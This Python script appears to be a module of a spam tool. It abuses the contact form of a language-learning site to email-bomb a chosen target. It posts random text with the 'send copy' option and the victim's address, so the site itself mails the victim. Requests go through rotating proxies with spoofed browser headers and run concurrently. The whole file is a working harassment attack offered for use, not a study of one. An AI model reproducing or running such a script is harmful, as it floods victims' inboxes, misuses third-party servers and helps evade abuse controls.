cookies = {
    '_ga': 'GA1.2.2052315569.1677855787',
    '_gid': 'GA1.2.2043522275.1677855787',
    '__utma': '32308960.2052315569.1677855787.1677855787.1677855787.1',
    '__utmb': '32308960.0.10.1677855787',
    '__utmc': '32308960',
    '__utmz': '32308960.1677855787.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '_gat_gtag_UA_163841241_1': '1',
}

headers = {
    'Accept': 'text/html, */*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Cookie': '_ga=GA1.2.2052315569.1677855787; _gid=GA1.2.2043522275.1677855787; __utma=32308960.2052315569.1677855787.1677855787.1677855787.1; __utmb=32308960.0.10.1677855787; __utmc=32308960; __utmz=32308960.1677855787.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _gat_gtag_UA_163841241_1=1',
    'Origin': 'https://www.opticlingo.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.opticlingo.com/contact.php',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

s = 'Thank you'
from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'message': self.get_text(),
            'name': self.get_text(),
            'email': target,
            'send_copy': '1',
        }

        response = requests.post('https://www.opticlingo.com/sendmail.php', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=20)
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
